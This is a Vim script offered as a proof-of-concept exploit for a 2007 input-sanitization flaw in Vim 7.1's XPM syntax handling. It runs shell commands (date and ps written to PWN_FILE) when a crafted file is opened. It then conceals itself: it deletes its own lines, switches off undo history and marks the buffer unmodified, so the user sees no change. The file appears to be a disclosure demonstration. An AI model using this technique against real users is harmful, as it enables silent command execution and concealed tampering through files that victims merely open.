" Vim 7.1 missing untrusted input sanitization in xpm.vim: exploit
"
" Copyright: Copyright 2007 Jan Minar <rdancer@gmail.com>
" License:   GPLv2
" Usage:     See the accompanying Makefile


" Arbitrary command execution here

silent execute '!date -R  > PWN_FILE'
silent execute '!ps f    >> PWN_FILE'


" Hide this script

" This works seamlessly even when the file is readonly -- beautiful!
" The first line is the /* XPM * / -- leave it.
silent 2,/^CUT_HERE/d

" Changes? -- What changes?
let b:undolevels_saved = &undolevels
let &undolevels = -1
" One change is still remembered
silent! s/.\?/&/
let &undolevels = b:undolevels_saved 
unlet b:undolevels_saved
set nomodified


" Load the syntax

let &l:filetype = &l:filetype


" Do not source the rest of the XPM

finish


" Modeline
" vim: syntax=vim :
